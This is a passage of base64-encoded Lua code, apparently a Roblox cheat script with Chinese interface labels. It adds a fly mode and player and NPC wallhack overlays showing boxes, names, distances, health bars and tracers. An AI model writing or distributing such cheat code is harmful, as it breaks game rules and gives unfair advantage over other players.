2RlID09IEVudW0uS2V5Q29kZS5CdXR0b25MMyB0aGVuCiAgICAgICAgICAgICAgICBjdHJsLmQgPSAxCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICAKICAgICAgICBpbnB1dEVuZGVkQ29ubiA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpLklucHV0RW5kZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgaWYgbm90IGZseWluZyB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlcgdGhlbgogICAgICAgICAgICAgICAgY3RybC5mID0gMAogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuUyB0aGVuCiAgICAgICAgICAgICAgICBjdHJsLmIgPSAwCiAgICAgICAgICAgIGVsc2VpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5BIHRoZW4KICAgICAgICAgICAgICAgIGN0cmwubCA9IDAKICAgICAgICAgICAgZWxzZWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkQgdGhlbgogICAgICAgICAgICAgICAgY3RybC5yID0gMAogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuU3BhY2UgdGhlbgogICAgICAgICAgICAgICAgY3RybC51ID0gMAogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wgb3IgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuQnV0dG9uTDMgdGhlbgogICAgICAgICAgICAgICAgY3RybC5kID0gMAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIHN0b3BGbHlpbmcoKQogICAgZW5kKQogICAgCiAgICBUYWIyOkNyZWF0ZVNlY3Rpb24oIumjnuihjOWKn+iDvSIpCiAgICAKICAgIFRhYjI6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuWQr+eUqOmjnuihjCIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBpZiB2IHRoZW4KICAgICAgICAgICAgICAgIHN0YXJ0Rmx5aW5nKCkKICAgICAgICAgICAgICAgIHNldHVwSW5wdXQoKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBzdG9wRmx5aW5nKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIyOkNyZWF0ZVNsaWRlcih7CiAgICAgICAgTmFtZSA9ICLpo57ooYzpgJ/luqYiLAogICAgICAgIFJhbmdlID0gezEwLCAyMDB9LAogICAgICAgIEluY3JlbWVudCA9IDUsCiAgICAgICAgU3VmZml4ID0gIuWNleS9jSIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZmx5U3BlZWQsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICAgICAgZmx5U3BlZWQgPSB2YWx1ZQogICAgICAgICAgICBpZiBmbHlpbmcgdGhlbgogICAgICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICLpo57ooYzmqKHlvI8iLAogICAgICAgICAgICAgICAgICAgIENvbnRlbnQgPSAi6aOe6KGM6YCf5bqm5pu05paw5Li6OiAiIC4uIGZseVNwZWVkLAogICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMiwKICAgICAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVMYWJlbCgi5o6n5Yi25pa55byPOiIpCiAgICBUYWIyOkNyZWF0ZUxhYmVsKCJXL0EvUy9EIC0g5YmN5ZCO5bem5Y+z56e75YqoIikKICAgIFRhYjI6Q3JlYXRlTGFiZWwoIuepuuagvOmUriAtIOWQkeS4iumjnuihjCIpCiAgICBUYWIyOkNyZWF0ZUxhYmVsKCJDdHJs6ZSuIC0g5ZCR5LiL6aOe6KGMIikKICAgIAogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIC0tIOWinuW8uueJiOeOqeWutiBFU1DvvIjlkKvpmJ/kvI3mo4DmtYvjgIHot53nprvjgIHooYDmnaHlkoznur/mnaHnu5jliLbvvIktIOWNh+e6p+S4uueLrOeri+W8gOWFs+mUrgogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIGxvY2FsIGVzcFNldHRpbmdzID0gewogICAgICAgIGVuYWJsZWQgPSBmYWxzZSwKICAgICAgICBzaG93Qm94ID0gZmFsc2UsCiAgICAgICAgc2hvd05hbWUgPSBmYWxzZSwKICAgICAgICBzaG93RGlzdGFuY2UgPSBmYWxzZSwKICAgICAgICBzaG93SGVhbHRoQmFyID0gZmFsc2UsCiAgICAgICAgc2hvd0hlYWx0aFRleHQgPSBmYWxzZSwKICAgICAgICBzaG93VHJhY2VyID0gZmFsc2UsCiAgICAgICAgdHJhY2VyUG9zaXRpb24gPSAiQm90dG9tIiwKICAgICAgICBzaG93RW5lbXlPbmx5ID0gZmFsc2UKICAgIH0KICAgIAogICAgbG9jYWwgZXNwQ2FjaGUgPSB7fQoKICAgIGxvY2FsIGZ1bmN0aW9uIGdldFRlYW1Db2xvcihwbHIpCiAgICAgICAgaWYgcGxyLlRlYW0gYW5kIExvY2FsUGxheWVyLlRlYW0gYW5kIHBsci5UZWFtID09IExvY2FsUGxheWVyLlRlYW0gdGhlbgogICAgICAgICAgICByZXR1cm4gQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAwKQogICAgICAgIGVsc2UKICAgICAgICAgICAgcmV0dXJuIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGlzVGVhbW1hdGUocGxyKQogICAgICAgIGlmIHBsci5UZWFtIGFuZCBMb2NhbFBsYXllci5UZWFtIGFuZCBwbHIuVGVhbSA9PSBMb2NhbFBsYXllci5UZWFtIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZUVTUE9iamVjdChwbHIpCiAgICAgICAgbG9jYWwgZXNwID0gewogICAgICAgICAgICBCb3ggPSBEcmF3aW5nLm5ldygiUXVhZCIpLAogICAgICAgICAgICBOYW1lID0gRHJhd2luZy5uZXcoIlRleHQiKSwKICAgICAgICAgICAgRGlzdGFuY2UgPSBEcmF3aW5nLm5ldygiVGV4dCIpLAogICAgICAgICAgICBIZWFsdGhCYXIgPSBEcmF3aW5nLm5ldygiUXVhZCIpLAogICAgICAgICAgICBIZWFsdGhUZXh0ID0gRHJhd2luZy5uZXcoIlRleHQiKSwKICAgICAgICAgICAgVHJhY2VyID0gRHJhd2luZy5uZXcoIkxpbmUiKQogICAgICAgIH0KICAgICAgICAKICAgICAgICBlc3AuQm94LlRoaWNrbmVzcyA9IDEuNQogICAgICAgIGVzcC5Cb3guRmlsbGVkID0gZmFsc2UKICAgICAgICBlc3AuQm94LlpJbmRleCA9IDUKICAgICAgICAKICAgICAgICBlc3AuTmFtZS5TaXplID0gMTgKICAgICAgICBlc3AuTmFtZS5DZW50ZXIgPSB0cnVlCiAgICAgICAgZXNwLk5hbWUuT3V0bGluZSA9IHRydWUKICAgICAgICBlc3AuTmFtZS5aSW5kZXggPSA2CiAgICAgICAgCiAgICAgICAgZXNwLkRpc3RhbmNlLlNpemUgPSAxNgogICAgICAgIGVzcC5EaXN0YW5jZS5DZW50ZXIgPSB0cnVlCiAgICAgICAgZXNwLkRpc3RhbmNlLk91dGxpbmUgPSB0cnVlCiAgICAgICAgZXNwLkRpc3RhbmNlLlpJbmRleCA9IDYKICAgICAgICAKICAgICAgICBlc3AuSGVhbHRoQmFyLkZpbGxlZCA9IHRydWUKICAgICAgICBlc3AuSGVhbHRoQmFyLlRoaWNrbmVzcyA9IDEKICAgICAgICBlc3AuSGVhbHRoQmFyLlpJbmRleCA9IDUKICAgICAgICAKICAgICAgICBlc3AuSGVhbHRoVGV4dC5TaXplID0gMTQKICAgICAgICBlc3AuSGVhbHRoVGV4dC5DZW50ZXIgPSB0cnVlCiAgICAgICAgZXNwLkhlYWx0aFRleHQuT3V0bGluZSA9IHRydWUKICAgICAgICBlc3AuSGVhbHRoVGV4dC5aSW5kZXggPSA2CiAgICAgICAgCiAgICAgICAgZXNwLlRyYWNlci5UaGlja25lc3MgPSAxLjUKICAgICAgICBlc3AuVHJhY2VyLlpJbmRleCA9IDQKICAgICAgICAKICAgICAgICBlc3BDYWNoZVtwbHJdID0gZXNwCiAgICAgICAgcmV0dXJuIGVzcAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gdXBkYXRlRVNQKCkKICAgICAgICBpZiBub3QgZXNwU2V0dGluZ3MuZW5hYmxlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyID09IExvY2FsUGxheWVyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBlc3BTZXR0aW5ncy5zaG93RW5lbXlPbmx5IGFuZCBpc1RlYW1tYXRlKHBscikgdGhlbgogICAgICAgICAgICAgICAgaWYgZXNwQ2FjaGVbcGxyXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhlc3BDYWNoZVtwbHJdKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBvYmouVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgY2hhciA9IHBsci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgbm90IGNoYXIgdGhlbgogICAgICAgICAgICAgICAgaWYgZXNwQ2FjaGVbcGxyXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhlc3BDYWNoZVtwbHJdKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBvYmouVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGNvbnRpbnVlIAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgbG9jYWwgaGVhZCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBub3QgKHJvb3QgYW5kIGhlYWQgYW5kIGh1bWFub2lkKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgcm9vdFBvcywgcm9vdFZpcyA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChyb290LlBvc2l0aW9uKQogICAgICAgICAgICBsb2NhbCBoZWFkUG9zLCBoZWFkVmlzID0gQ2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KGhlYWQuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygwLCAxLjUsIDApKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgbm90IChyb290VmlzIGFuZCBoZWFkVmlzKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBlc3BDYWNoZVtwbHJdIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKGVzcENhY2hlW3Bscl0pIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIG9iai5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBlc3AgPSBlc3BDYWNoZVtwbHJdIG9yIGNyZWF0ZUVTUE9iamVjdChwbHIpCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBoZWlnaHQgPSBtYXRoLmFicyhoZWFkUG9zLlkgLSByb290UG9zLlkpICogMS41CiAgICAgICAgICAgIGxvY2FsIHdpZHRoID0gaGVpZ2h0ICogMC42CiAgICAgICAgICAgIGxvY2FsIGxlZnQgPSBoZWFkUG9zLlggLSB3aWR0aCAvIDIKICAgICAgICAgICAgbG9jYWwgcmlnaHQgPSBoZWFkUG9zLlggKyB3aWR0aCAvIDIKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGNvbG9yID0gZ2V0VGVhbUNvbG9yKHBscikKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIOeLrOeri+aOp+WItuavj+S4quWFg+e0oOeahOaYvuekugogICAgICAgICAgICBlc3AuQm94LlZpc2libGUgPSBlc3BTZXR0aW5ncy5zaG93Qm94CiAgICAgICAgICAgIGVzcC5Cb3guQ29sb3IgPSBjb2xvcgogICAgICAgICAgICBlc3AuQm94LlBvaW50QSA9IFZlY3RvcjIubmV3KGxlZnQsIGhlYWRQb3MuWSkKICAgICAgICAgICAgZXNwLkJveC5Qb2ludEIgPSBWZWN0b3IyLm5ldyhyaWdodCwgaGVhZFBvcy5ZKQogICAgICAgICAgICBlc3AuQm94LlBvaW50QyA9IFZlY3RvcjIubmV3KHJpZ2h0LCBoZWFkUG9zLlkgKyBoZWlnaHQpCiAgICAgICAgICAgIGVzcC5Cb3guUG9pbnREID0gVmVjdG9yMi5uZXcobGVmdCwgaGVhZFBvcy5ZICsgaGVpZ2h0KQogICAgICAgICAgICAKICAgICAgICAgICAgZXNwLk5hbWUuVmlzaWJsZSA9IGVzcFNldHRpbmdzLnNob3dOYW1lCiAgICAgICAgICAgIGVzcC5OYW1lLkNvbG9yID0gY29sb3IKICAgICAgICAgICAgZXNwLk5hbWUuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhoZWFkUG9zLlgsIGhlYWRQb3MuWSAtIDIwKQogICAgICAgICAgICBlc3AuTmFtZS5UZXh0ID0gcGxyLk5hbWUKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGRpc3RhbmNlID0gbWF0aC5mbG9vcigocm9vdC5Qb3NpdGlvbiAtIENhbWVyYS5DRnJhbWUuUG9zaXRpb24pLk1hZ25pdHVkZSkKICAgICAgICAgICAgZXNwLkRpc3RhbmNlLlZpc2libGUgPSBlc3BTZXR0aW5ncy5zaG93RGlzdGFuY2UKICAgICAgICAgICAgZXNwLkRpc3RhbmNlLkNvbG9yID0gY29sb3IKICAgICAgICAgICAgZXNwLkRpc3RhbmNlLlBvc2l0aW9uID0gVmVjdG9yMi5uZXcoaGVhZFBvcy5YLCBoZWFkUG9zLlkgKyBoZWlnaHQgKyA1KQogICAgICAgICAgICBlc3AuRGlzdGFuY2UuVGV4dCA9IHRvc3RyaW5nKGRpc3RhbmNlKSAuLiAibSIKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGhlYWx0aFBlcmNlbnQgPSBtYXRoLmNsYW1wKGh1bWFub2lkLkhlYWx0aCAvIGh1bWFub2lkLk1heEhlYWx0aCwgMCwgMSkKICAgICAgICAgICAgbG9jYWwgYmFyV2lkdGggPSB3aWR0aAogICAgICAgICAgICBsb2NhbCBiYXJIZWlnaHQgPSA1CiAgICAgICAgICAgIGxvY2FsIGJhclggPSBsZWZ0CiAgICAgICAgICAgIGxvY2FsIGJhclkgPSBoZWFkUG9zLlkgKyBoZWlnaHQgKyAyMAogICAgICAgICAgICAKICAgICAgICAgICAgZXNwLkhlYWx0aEJhci5WaXNpYmxlID0gZXNwU2V0dGluZ3Muc2hvd0hlYWx0aEJhcgogICAgICAgICAgICBlc3AuSGVhbHRoQmFyLkNvbG9yID0gQ29sb3IzLm5ldygxIC0gaGVhbHRoUGVyY2VudCwgaGVhbHRoUGVyY2VudCwgMCkKICAgICAgICAgICAgZXNwLkhlYWx0aEJhci5Qb2ludEEgPSBWZWN0b3IyLm5ldyhiYXJYLCBiYXJZKQogICAgICAgICAgICBlc3AuSGVhbHRoQmFyLlBvaW50QiA9IFZlY3RvcjIubmV3KGJhclggKyBiYXJXaWR0aCAqIGhlYWx0aFBlcmNlbnQsIGJhclkpCiAgICAgICAgICAgIGVzcC5IZWFsdGhCYXIuUG9pbnRDID0gVmVjdG9yMi5uZXcoYmFyWCArIGJhcldpZHRoICogaGVhbHRoUGVyY2VudCwgYmFyWSArIGJhckhlaWdodCkKICAgICAgICAgICAgZXNwLkhlYWx0aEJhci5Qb2ludEQgPSBWZWN0b3IyLm5ldyhiYXJYLCBiYXJZICsgYmFySGVpZ2h0KQogICAgICAgICAgICAKICAgICAgICAgICAgZXNwLkhlYWx0aFRleHQuVmlzaWJsZSA9IGVzcFNldHRpbmdzLnNob3dIZWFsdGhUZXh0CiAgICAgICAgICAgIGVzcC5IZWFsdGhUZXh0LkNvbG9yID0gQ29sb3IzLm5ldygxLCAxLCAxKQogICAgICAgICAgICBlc3AuSGVhbHRoVGV4dC5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KGJhclggKyBiYXJXaWR0aCAvIDIsIGJhclkgLSAxMCkKICAgICAgICAgICAgZXNwLkhlYWx0aFRleHQuVGV4dCA9IG1hdGguZmxvb3IoaHVtYW5vaWQuSGVhbHRoKSAuLiAiLyIgLi4gbWF0aC5mbG9vcihodW1hbm9pZC5NYXhIZWFsdGgpCiAgICAgICAgICAgIAogICAgICAgICAgICBlc3AuVHJhY2VyLlZpc2libGUgPSBlc3BTZXR0aW5ncy5zaG93VHJhY2VyCiAgICAgICAgICAgIGVzcC5UcmFjZXIuQ29sb3IgPSBjb2xvcgogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgc3RhcnRQb2ludAogICAgICAgICAgICBpZiBlc3BTZXR0aW5ncy50cmFjZXJQb3NpdGlvbiA9PSAiVG9wIiB0aGVuCiAgICAgICAgICAgICAgICBzdGFydFBvaW50ID0gVmVjdG9yMi5uZXcoQ2FtZXJhLlZpZXdwb3J0U2l6ZS5YLzIsIDApCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHN0YXJ0UG9pbnQgPSBWZWN0b3IyLm5ldyhDYW1lcmEuVmlld3BvcnRTaXplLlgvMiwgQ2FtZXJhLlZpZXdwb3J0U2l6ZS5ZKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGVuZFBvaW50ID0gVmVjdG9yMi5uZXcoaGVhZFBvcy5YLCBoZWFkUG9zLlkgKyBoZWlnaHQvMikKICAgICAgICAgICAgCiAgICAgICAgICAgIGVzcC5UcmFjZXIuRnJvbSA9IHN0YXJ0UG9pbnQKICAgICAgICAgICAgZXNwLlRyYWNlci5UbyA9IGVuZFBvaW50CiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgZm9yIHBsciwgZXNwIGluIHBhaXJzKGVzcENhY2hlKSBkbwogICAgICAgICAgICBpZiBub3QgcGxyIG9yIG5vdCBwbHIuUGFyZW50IG9yIHBsciA9PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKGVzcCkgZG8KICAgICAgICAgICAgICAgICAgICBvYmouVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgb2JqOlJlbW92ZSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVzcENhY2hlW3Bscl0gPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBlc3BMb29wCiAgICAKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSBOUEMg6YCP6KeG77yI5aKe5by654mI77yJLSDljYfnuqfkuLrni6znq4vlvIDlhbPplK4KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICBsb2NhbCBucGNFc3BTZXR0aW5ncyA9IHsKICAgICAgICBlbmFibGVkID0gZmFsc2UsCiAgICAgICAgc2hvd0JveCA9IGZhbHNlLAogICAgICAgIHNob3dOYW1lID0gZmFsc2UsCiAgICAgICAgc2hvd0Rpc3RhbmNlID0gZmFsc2UKICAgIH0KICAgIAogICAgbG9jYWwgbnBjRXNwQ2FjaGUgPSB7fQogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVOcGNFU1BPYmplY3QobW9kZWwpCiAgICAgICAgbG9jYWwgZXNwID0gewogICAgICAgICAgICBCb3ggPSBEcmF3aW5nLm5ldygiUXVhZCIpLAogICAgICAgICAgICBOYW1lID0gRHJhd2luZy5uZXcoIlRleHQiKSwKICAgICAgICAgICAgRGlzdGFuY2UgPSBEcmF3aW5nLm5ldygiVGV4dCIpCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVzcC5Cb3guVGhpY2tuZXNzID0gMS41CiAgICAgICAgZXNwLkJveC5GaWxsZWQgPSBmYWxzZQogICAgICAgIGVzcC5Cb3guQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE2NSwgMCkKICAgICAgICBlc3AuQm94LlpJbmRleCA9IDQKICAgICAgICAKICAgICAgICBlc3AuTmFtZS5TaXplID0gMTYKICAgICAgICBlc3AuTmFtZS5DZW50ZXIgPSB0cnVlCiAgICAgICAgZXNwLk5hbWUuT3V0bGluZSA9IHRydWUKICAgICAgICBlc3AuTmFtZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTY1LCAwKQogICAgICAgIGVzcC5OYW1lLlpJbmRleCA9IDQKICAgICAgICAKICAgICAgICBlc3AuRGlzdGFuY2UuU2l6ZSA9IDE0CiAgICAgICAgZXNwLkRpc3RhbmNlLkNlbnRlciA9IHRydWUKICAgICAgICBlc3AuRGlzdGFuY2UuT3V0bGluZSA9IHRydWUKICAgICAgICBlc3AuRGlzdGFuY2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE2NSwgMCkKICAgICAgICBlc3AuRGlzdGFuY2UuWkluZGV4ID0gNAogICAgICAgIAogICAgICAgIG5wY0VzcENhY2hlW21vZGVsXSA9IGVzcAogICAgICAgIHJldHVybiBlc3AKICAgIGVuZAogICAgCiAgICBsb2NhbCBmdW5jdGlvbiB1cGRhdGVOcGNFU1AoKQogICAgICAgIGlmIG5vdCBucGNFc3BTZXR0aW5ncy5lbmFibGVkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGZvciBfLCBtb2RlbCBpbiBpcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgIGlmIG1vZGVsOklzQSgiTW9kZWwiKSBhbmQgbW9kZWw6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGFuZCBub3QgUGxheWVyczpHZXRQbGF5ZXJGcm9tQ2hhcmFjdGVyKG1vZGVsKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gbW9kZWw6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBtb2RlbDpGaW5kRmlyc3RDaGlsZCgiVG9yc28iKQogICAgICAgICAgICAgICAgbG9jYWwgaGVhZCA9IG1vZGVsOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgbm90IChyb290IGFuZCBoZWFkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbnBjRXNwQ2FjaGVbbW9kZWxdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhucGNFc3BDYWNoZVttb2RlbF0pIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvYmouVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBvcywgcm9vdFZpcyA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChyb290LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgbG9jYWwgaGVhZFBvcywgaGVhZFZpcyA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChoZWFkLlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMCwgMS41LCAwKSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgbm90IChyb290VmlzIGFuZCBoZWFkVmlzKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbnBjRXNwQ2FjaGVbbW9kZWxdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhucGNFc3BDYWNoZVttb2RlbF0pIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvYmouVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgZXNwID0gbnBjRXNwQ2FjaGVbbW9kZWxdIG9yIGNyZWF0ZU5wY0VTUE9iamVjdChtb2RlbCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgaGVpZ2h0ID0gbWF0aC5hYnMoaGVhZFBvcy5ZIC0gcm9vdFBvcy5ZKSAqIDEuNQogICAgICAgICAgICAgICAgbG9jYWwgd2lkdGggPSBoZWlnaHQgKiAwLjYKICAgICAgICAgICAgICAgIGxvY2FsIGxlZnQgPSBoZWFkUG9zLlggLSB3aWR0aCAvIDIKICAgICAgICAgICAgICAgIGxvY2FsIHJpZ2h0ID0gaGVhZFBvcy5YICsgd2lkdGggLyAyCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGVzcC5Cb3guVmlzaWJsZSA9IG5wY0VzcFNldHRpbmdzLnNob3dCb3gKICAgICAgICAgICAgICAgIGVzcC5Cb3guUG9pbnRBID0gVmVjdG9yMi5uZXcobGVmdCwgaGVhZFBvcy5ZKQogICAgICAgICAgICAgICAgZXNwLkJveC5Qb2ludEIgPSBWZWN0b3IyLm5ldyhyaWdodCwgaGVhZFBvcy5ZKQogICAgICAgICAgICAgICAgZXNwLkJveC5Qb2ludEMgPSBWZWN0b3IyLm5ldyhyaWdodCwgaGVhZFBvcy5ZICsgaGVpZ2h0KQogICAgICAgICAgICAgICAgZXNwLkJveC5Qb2ludEQgPSBWZWN0b3IyLm5ldyhsZWZ0LCBoZWFkUG9zLlkgKyBoZWlnaHQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGVzcC5OYW1lLlZpc2libGUgPSBucGNFc3BTZXR0aW5ncy5zaG93TmFtZQogICAgICAgICAgICAgICAgZXNwLk5hbWUuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhoZWFkUG9zLlgsIGhlYWRQb3MuWSAtIDE1KQogICAgICAgICAgICAgICAgZXNwLk5hbWUuVGV4dCA9IG1vZGVsLk5hbWUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgZGlzdGFuY2UgPSBtYXRoLmZsb29yKChyb290LlBvc2l0aW9uIC0gQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbikuTWFnbml0dWRlKQogICAgICAgICAgICAgICAgZXNwLkRpc3RhbmNlLlZpc2libGUgPSBucGNFc3BTZXR0aW5ncy5zaG93RGlzdGFuY2UKICAgICAgICAgICAgICAgIGVzcC5EaXN0YW5jZS5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KGhlYWRQb3MuWCwgaGVh